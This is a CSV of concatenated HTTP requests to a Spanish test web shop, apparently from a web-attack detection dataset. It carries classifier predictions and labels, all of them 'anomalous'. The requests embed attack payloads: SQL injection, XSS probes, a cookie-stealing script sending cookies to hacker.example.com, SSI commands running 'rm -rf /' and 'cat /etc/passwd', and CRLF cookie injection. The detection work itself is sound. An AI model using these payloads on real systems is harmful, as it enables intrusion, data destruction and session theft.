data,y_pred,y_test
"posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas','0','0','0','0');waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1/&nombre=vino+rioja&precio=100&cantidad=36&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/web-inf/web.xml gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=vino+rioja&precio=85&cantidad=80&b1=a�adir+al+carrito puthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ettridge&pwd=guaranga&remember=on&b1=entrar gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39&cantidad=%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito','0','0','0');waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6771&b1=confirmar/",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico';+drop+table+usuarios;+select+*+from+datos+where+nombre+like+'%&precio=100&cantidad=43&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 gethttp://localhost:8080/tienda1/publico/pagar.jsp.inc gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%3f&precio=8816&b1=pasar+por+caja gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&logina=chartran&pwd=sapillo&remember=off&b1=entrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6071<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+-->&b1=confirmar gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja&precio=100&cantidad=92&b1a=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=| posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasany%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=crickard&pwd=llamear&remember=off&b1a=entrar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=cristi<!--#exec+cmd=""ls+/""-->&pwd=corac27o&remember=on&b1=entrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=teriann&password=bim42or&nombre=archibaldo&apellidos=villavecchia+bernal&email=seidler.pedro@investopi.bt&dni=69492946x&direccion=c/+isabel+ii+151,+2b&ciudad=vilamalla&cp=09450&provincia=zamora&ntc=6106115865632521and+1=1&b1=registrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7092&b1=confirmarany%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727%0d%0a gethttp://localhost:8080http://localhost:9090/exampleswebapp/orderparser.jsp?xmlfile=c:/bea/weblogic81/samples/server/examples/src/examples/xml/orderparser/order.xml gethttp://localhost:8080/tienda1/global/creditos.jsp/~ gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hawryszk7&password=as8643o0d4&nombre=paloma&apellidos=paros%22%20style=%22background:url(javascript:alert('paros'))&email=cailloy@941.lt&dni=02251300z&direccion=calle+chafarinas+168+&ciudad=d�rcal&cp=19119&provincia=zaragoza&ntc=9097917444528298&b1=registrar posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=queso+manchego&precio=100/&cantidad=20&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%3f",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&logina=euysoo&password=m7n�fica&nombre=tarciano&apellidos=donnadieu+vivanco&email=dombasle@tagarautomation.ad&dni=30585356w&direccion=calle+santo+domingo+savio+174+13-b&ciudad=jubrique&cp=49325&provincia=badajoz&ntc=9595137071003174&b1=registrar posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=olivie&password=re0348n1ar&nombre=ivan&apellidos=elbar+brice�o&email=elliot3@connect.li&dni=65683923v&direccion=los+caminos,+129,+13-g&ciudad=hinojosa+del+campo&cpa=10130&provincia=palencia&ntc=7487181086019639&b1=registrar gethttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=1881&b1=pasar+por+caja gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=','0','0','0');waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=794&b1=pasar+por+caja posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=3&nombre=vino+rioja&precio=39&cantidad=4&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/index.jsp/4861362529278789730 posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=ques+o+manchego&precio=85&cantidad=4&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=tres-sup&pwd=qui4erear&remember=onbob@<script>alert(paros)</script>.parosproxy.org&b1=entrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3512&b1=pasar+por+caja/ gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=any%3f%0aset-cookie%3a+tamper%3d5765205567234876235 posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wilkinso&password=chubasque4o&nombre=tideo&apellidos=bugnone&email=hartigan@porqueagel.mc&dni=54839907h&direccion=calle+san+braulio,+198+&ciudad=longares&cp=08440&provinciaa=burgos&ntc=3980165808897120&b1=registrar gethttp://localhost:8080/tienda1/miembros/salir.jsp/4861362529278789730 gethttp://localhost:8080/tienda1/miembros/editar.jsp/asf-logo-wide.gif.old gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=jam�n+ib�rico&precio=100&cantidad=57&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precio=100/&cantidad=15&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=carringt&password=pis7ar&nombre=tristana&apellidos=isart+viva&email=rae@ajuntamentbarcelona20.kg&dni=29b8528b7b0c&direccion=c/+argullos+73,+9?a&ciudad=figueruelas&cp=49655&provincia=a+coru�a&ntc=3983167726534410&b1=registrar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=culberso&pwd=r-',estau/9ar&remember=off&b1=entrar",anomalous,anomalous
"gethttp://localhost:8080/tienda1.bak gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp/asf-logo-wide.old gethttp://localhost:8080/~ gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=%2b posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=field&password=dis.cordante&nombre=gianfranco&apellidos=dausset+cartaya&email=patch@francislucille.sm&dni=88600786w&direcciona=calle+o+outeiro,+189+&ciudad=ojos+negros&cp=05145&provincia=ja�n&ntc=2726120366326449&b1=registrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=darn&password=ahidalg,ado&nombre=ravi&apellidos=morell&email=costa_lejeune@clichotel.my&dni=16929821g&direccion=ingeniero+mari�o,+170+10-a&ciudad=parets+del+vall�s&cp=20577&provincia=barcelona&ntc=7457334236490109&b1=registrar posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%7c posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id='or'a='a",anomalous,anomalous
"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=defalco&password=botonesset-cookie%3a+tamper%3d1041264011025374727&nombre=suyai&apellidos=r�bago+patraca&email=ghenaiem_berlin@hipotecascom.je&dni=24778234n&direccion=c/+la+salpa+104,+&ciudad=moral+de+la+reina&cp=10334&provincia=burgos&ntc=5823821605242067&b1=registrar posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tudor&password=28a2quizo&nombre=camilo&apellidos=eremian+de+la+sota&email=lauterbach@nanogenerador.ic&dni=24061408g&direccion=call+e+el+rincon+69+&ciudad=ciudad+real&cp=08553&provincia=badajoz&ntc=5945196331395771&b1=registrar posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=sood&password=4,ang,el�n&nombre=alessandra&apellidos=urioste+bohigas&email=rasmussen.ludlam8@easyviaggio.pw&dni=91389293n&direccion=calle+andaluziako+komunitatea,+156+9?g&ciudad=hu�neja&cp=05358&provincia=baleares+(illes)&ntc=5011039662886040&b1=registrar gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=briard&password=ur7anismo&nombre=vitalbob@<script>alert(paros)</script>.parosproxy.org&apellidos=bonafina+cansino&email=gayou@transportesvegasl.bm&dni=65630152c&direccion=c/+marques+de+lema+188+13g&ciudad=rueda+de+jal�n&cp=03510&provincia=le�n&ntc=7816475254908142&b1=registrar gethttp://localhost:8080/samples/dbsamp/dbsamp1.htm gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=charo&pwd=1nf9m5&remember=on/&b1=entrar gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2 puthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=emerson&password=imperialista&nombre=nevnka&apellidos=eraso+rebes&email=cooper@telelujo.coop&dni=93314361a&direccion=plaza+morquera+s/n+&ciudad=graja+de+campalbo&cp=49638&provincia=almer�a&ntc=1918567555669782&b1=registrar posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2",anomalous,anomalous
"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modoa=registro&login=ning&password=graciosamente&nombre=roc�o+libertad&apellidos=oviol+de+la+quintana&email=tchoukova@sgi-sl.is&dni=16822336k&direccion=urbanizacion+palmeras,+s/n,+&ciudad=oropesa&cp=17723&provincia=segovia&ntc=1507392936285379&b1=registrar posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7391&b1=confirmar/ posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1','0');waitfor+delay+'0:0:15';-- gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727 gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=betty-an5&password=mo9qu0ado&nombre=cesaria'n&apellidos=ivern&email=veazie-bolin@tiaherminia.tj&dni=32245892f&direccion=calle+luis+piernas+86+11-e&ciudad=gerindote&cp=46443&provincia=almer�a&ntc=8173244424971818&b1=registrar gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precio=39/&cantidad=89&b1=a�adir+al+carrito gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7990&b1=pasar+por+caja/ gethttp://localhost:8080/4861362529278789730 posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritoany%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727%0d%0a gethttp://localhost:8080/tienda1/imagenes/nuestratierra.jpg.bak posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3375&b1a=pasar+por+caja gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=reiman&password=bo01q9265_ta&nombre=malias&apellidosa=orfila+ochotorrena&email=hamshire_kell@santcugatpisos.sj&dni=38449483s&direccion=avda.+arcangel,+98,+5?f&ciudad=alc�zar+del+rey&cp=31500&provincia=a+coru�a&ntc=0056594046800438&b1=registrar posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dodds&password=mohatrar&nombre=jaled&apellidos=lizancos&email=fong@zarahealth.bh&dni=22640068h&direccion=calle+braoj+os,+158*,+&ciudad=alcubilla+de+las+pe�as&cp=47130&provincia=salamanca&ntc=4180753654421138&b1=registrar posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sydeman6&pwd=0nc/on/6it,ar&remember=on&b1=entrar posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritobob@<script>alert(paros)</script>.parosproxy.org gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=2",anomalous,anomalous
"posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=paros%22%20style=%22background:url(javascript:alert('paros'))&b1=pasar+por+caja posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>&login=leilah&password=c0855m05l13&nombre=rachid&apellidos=specie&email=tansey@cohel.tel&dni=85978887b&direccion=c/+uruguay,+17,+&ciudad=sitges&cp=08840&provincia=salamanca&ntc=2191408173155775&b1=registrar gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=39/&cantidad=28&b1=a�adir+al+carrito puthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=jam�n+ib�rico&precio=100&cantidad=97&b1=a�adir+al+carrito posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1 posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasbob@<script>alert(paros)</script>.parosproxy.org posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bienek&password=bujer�a&nombre=gianluca&apellidos=gesto+ball�n&email=halloran@sanchezgordo.pa&dnia=23139426t&direccion=c/+arco+de+las+orejas+76,+3?f&ciudad=torrehermosa&cp=29494&provincia=guadalajara&ntc=2829438543802993&b1=registrar gethttp://localhost:8080/cfide/administrator/homepage.cfm gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg/asf-logo-wide.gif.old",anomalous,anomalous
